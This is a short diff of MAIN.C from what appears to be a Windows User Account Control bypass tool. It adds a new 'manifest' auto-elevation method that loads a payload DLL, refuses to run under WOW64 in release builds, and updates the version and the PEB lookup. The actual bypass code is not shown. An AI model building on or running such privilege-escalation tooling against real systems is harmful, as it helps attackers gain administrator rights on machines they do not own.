@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.10
+*  VERSION:     2.20
 *
-*  DATE:        16 Apr 2016
+*  DATE:        25 May 2016
 *
 *  Program entry point.
 *
@@ -98,7 +98,7 @@ UINT ucmInit(
         //fill common data block
         RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
 
-        g_ctx.Peb = RtlGetCurrentPeb();
+        g_ctx.Peb = NtCurrentPeb();
         inst = g_ctx.Peb->ImageBaseAddress;
 
         dwType = 0;
@@ -610,6 +610,18 @@ UINT ucmMain()
         }
 #endif
         if (ucmStandardAutoElevation2(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodManifest:
+#ifndef _DEBUG
+        if (g_ctx.IsWow64) {
+            ucmShowMessage(LAZYWOW64UNSUPPORTED);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        if (ucmAutoElevateManifest(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
             return ERROR_SUCCESS;
         }
         break;
